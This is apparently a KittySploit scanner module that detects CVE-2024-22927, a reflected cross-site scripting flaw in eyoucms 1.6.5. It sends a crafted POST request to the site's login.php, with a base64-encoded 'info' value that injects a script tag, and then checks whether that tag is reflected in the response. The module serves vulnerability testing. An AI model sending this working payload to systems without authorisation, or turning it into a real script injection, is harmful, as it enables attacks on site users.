#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross Site Scripting (XSS) vulnerability in the func parameter in eyoucms v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'eyoucms v.1.6.5 - Cross-Site Scripting Detection',
        'description': 'Cross Site Scripting (XSS) vulnerability in the func parameter in eyoucms v.1.6.5 allows a remote attacker to run arbitrary code via crafted URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'eyoucms', 'cms', 'xss', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/weng-xianhu/eyoucms/issues/57',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-22927',
        ],
        'cve': 'CVE-2024-22927',
    }

    def run(self):
        path = '/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn='
        r = self.http_request(method='POST', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('name="num" value="1"><ScRiPt >alert(document.domain)</ScRiPt>', 'id="eytime"',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason='eyoucms v.1.6.5 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

